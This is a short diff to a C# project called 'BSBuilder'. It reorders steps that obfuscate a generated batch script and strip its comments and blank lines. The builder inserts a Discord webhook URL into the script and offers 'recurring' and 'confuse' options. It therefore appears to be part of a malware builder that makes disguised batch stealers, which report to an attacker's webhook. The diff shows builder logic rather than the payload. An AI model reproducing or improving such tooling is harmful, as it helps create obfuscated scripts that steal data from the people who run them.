@@ -334,6 +334,15 @@ namespace BSBuilder
                     if (webhook.Length != 0)
                         editVAR("set \"webhook=https://discord.com/api/webhooks/\"", "webhook", webhook);
 
+                    if (obfuscate)
+                        obfuscatebatch(batch, 1);
+
+                    if (optimize)
+                    {
+                        batch = Regex.Replace(batch, @"^::.*", string.Empty, RegexOptions.Multiline);
+                        batch = Regex.Replace(batch, @"^\s*$\n|\r", string.Empty, RegexOptions.Multiline);
+                    }
+
                     if (recurring)
                     {
                         removeGOTO("goto skiprecurring");
@@ -357,15 +366,6 @@ namespace BSBuilder
                     }
                     else if (optimize)
                         removeFUNCTION("goto skiprecurring");
-
-                    if (obfuscate)
-                        obfuscatebatch(batch, 1);
-
-                    if (optimize)
-                    {
-                        batch = Regex.Replace(batch, @"^::.*", string.Empty, RegexOptions.Multiline);
-                        batch = Regex.Replace(batch, @"^\s*$\n|\r", string.Empty, RegexOptions.Multiline);
-                    }
 
                     if (confuse)
                     {
